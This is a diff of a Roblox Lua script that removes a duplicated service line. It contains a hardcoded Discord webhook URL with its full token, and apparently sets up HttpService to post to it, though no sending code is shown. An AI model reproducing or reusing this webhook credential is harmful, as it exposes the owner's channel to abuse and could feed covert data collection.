@@ -7,7 +7,6 @@ repeat task.wait() until game:IsLoaded() and game:GetService("Players").LocalPla
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
 
 local WEBHOOK = "https://discord.com/api/webhooks/1442223867165806725/XMCJcGw8YuguZwbmGTJWy6xoZuY-swSg3pcDu-oc5e6DovI3OKHdKZyUl1Lf_NNy70YY" -- pls don't try to spam though this webhook because this webhook is on special server without anybody
 local HttpService = game:GetService("HttpService")
